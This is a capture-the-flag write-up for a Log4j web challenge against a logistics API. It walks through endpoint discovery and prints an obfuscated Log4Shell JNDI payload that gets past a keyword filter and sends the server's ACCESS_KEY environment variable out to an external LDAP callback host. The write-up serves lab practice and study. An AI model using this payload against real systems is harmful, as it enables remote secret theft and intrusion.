# (Not so) smart API
###### Web, Log4j


> You are mandated by Smart Transport & Logistics to test the latest API for their web service. One of these API points is used to obtain the access code to a storage facility. Recently, several thefts have occurred in this storage facility.
Discover the method used and get the access code to the warehouse (the flag).
Note: It is not necessary to have remote command execution to get the flag.
Challenge proposed by : AMOSSYS


#### TL;DR
* Find API endpoint
* Use Log4j attack to get API secret key (ACCESS_KEY)
* Get the flag using secret key

#### Challenge Discovery
By getting "swagger.json" file, we can easyli view wich endpoint are used by the API. (http://213.32.7.237:26241/api/swagger.json)

```The swagger.json file is a specification file that describes the REST APIs in accordance with the Swagger specification. The file describes details such as available endpoints, operations on each endpoint, input and output parameters for each operation, authentication methods, and other information. ```


That give us 2 endpoints:

* GET - /api/facility
` "description": "Return the acccess code to storage facility. User need to be authenticated. The server will compare the provided password encoded in base64 in the header X-API-Key with the one securely saved in environnement variable ACCESS_KEY."`

* POST - api/check 
`"description": "Check if the staff member is known.",`
`
"application/x-www-form-urlencoded": {
              "schema": {
                "type": "object",
                "properties": {
                  "nom": {
                    "type": "string"
                  },
                  "prenom": {
                    "type": "string"
                  }
                },
                "required": [
                  "nom",
                  "prenom"
                ]
`

So we can try to register a random user (`nom = a&prenom = a`)
```
curl -X POST http://213.32.7.237:27835/api/check -d "nom='a'&prenom='b'"
```
`Your are not in our database, we will Log your identity`
We learn that all our failed will be logged in the server.

#### Challenge Solve
As we know that every failed login will be logged, we can try to exploit log4j using `nom` or `prenom` attribut.

But we get 'Attack Detected' whenever we put `/` or `jdni`


thanks to : https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words

payload:
``` nom=${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}:${date:'/'}${date:'/'}log4shell.huntress.com:1389${date:'/'}hostname=${env:ACCESS_KEY}${date:'/'}9eb4a887-8176-4aaa-a6dd-83b96853d793}"&prenom="a" ```

After few seconds we get our ACCESS_KEY=`TEVfQ09OVEVYVEVfRVNUX0lOVEVSRVNTQU5U`

After that we just need to use this key in order to get the flag, using this endpoint: /api/facility
